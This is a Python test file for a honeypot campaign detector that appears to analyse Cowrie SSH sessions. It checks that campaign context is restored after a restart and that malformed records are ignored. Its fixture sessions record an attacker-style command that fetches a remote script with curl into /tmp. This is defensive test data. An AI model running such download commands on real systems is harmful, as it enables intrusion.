from intelligence.campaign.detector import CampaignDetector
from intelligence.campaign.persistence import restore_campaign_context
from intelligence.session.model import ReconstructedSession


ANALYSIS_EVENT_TYPE = "morpheus.intelligence.analysis"


def make_session(session_id, source_ip, timestamp):
    session = ReconstructedSession(
        session_id=session_id,
        source_ip=source_ip,
        protocol="ssh",
        client_version="SSH-2.0-TestClient",
        hassh="test-hassh",
        username="testuser",
        authentication_success=False,
        commands=['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        command_events=[],
        start_time=timestamp,
        end_time=timestamp,
        duration_ms=100,
    )
    return {
        "event_id": "event-" + session_id,
        "event_type": ANALYSIS_EVENT_TYPE,
        "source": "morpheus",
        "timestamp": timestamp,
        "data": {
            "session": {
                key: value
                for key, value in vars(session).items()
            },
            "fingerprint": None,
            "intents": [],
        },
    }


def test_restore_campaign_context_correlates_new_session_after_restart():
    historical_event = make_session(
        "old-session", "192.0.2.10", "2026-10-16T10:00:00+00:00"
    )

    restarted_detector = CampaignDetector()
    restored_ids = restore_campaign_context(
        restarted_detector, [historical_event]
    )

    assert restored_ids == {"old-session"}
    assert "old-session" in restarted_detector.sessions

    new_session = ReconstructedSession(
        session_id="new-session",
        source_ip="192.0.2.10",
        protocol="ssh",
        client_version="SSH-2.0-TestClient",
        hassh="test-hassh",
        username="testuser",
        authentication_success=False,
        commands=['whoami', 'curl -fsSL https://example.com/agent.sh -o /tmp/agent.sh'],
        command_events=[],
        start_time="2026-10-17T10:00:00+00:00",
        end_time="2026-10-17T10:00:01+00:00",
        duration_ms=1000,
    )

    campaign = restarted_detector.observe(new_session, intents=[])

    assert campaign is not None
    assert set(campaign.session_ids) == {"old-session", "new-session"}
    assert campaign.confidence_score > 0


def test_restore_ignores_raw_events_and_malformed_analysis_records():
    detector = CampaignDetector()
    events = [
        {
            "event_type": "cowrie.session.closed",
            "data": {"session": "raw-session"},
        },
        {
            "event_type": ANALYSIS_EVENT_TYPE,
            "data": {"session": "not-a-session-object"},
        },
        {
            "event_type": ANALYSIS_EVENT_TYPE,
            "data": {
                "session": {
                    "session_id": "",
                }
            },
        },
    ]

    restored_ids = restore_campaign_context(detector, events)

    assert restored_ids == set()
    assert detector.sessions == {}
    assert detector.campaigns == {}


def test_restore_uses_latest_analysis_per_session():
    old_event = make_session(
        "reused-session", "192.0.2.20", "2026-10-16T10:00:00+00:00"
    )
    newer_event = make_session(
        "reused-session", "192.0.2.30", "2026-10-17T10:00:00+00:00"
    )

    detector = CampaignDetector()
    restored_ids = restore_campaign_context(
        detector, [newer_event, old_event]
    )

    assert restored_ids == {"reused-session"}
    assert detector.sessions["reused-session"].source_ip == "192.0.2.30"
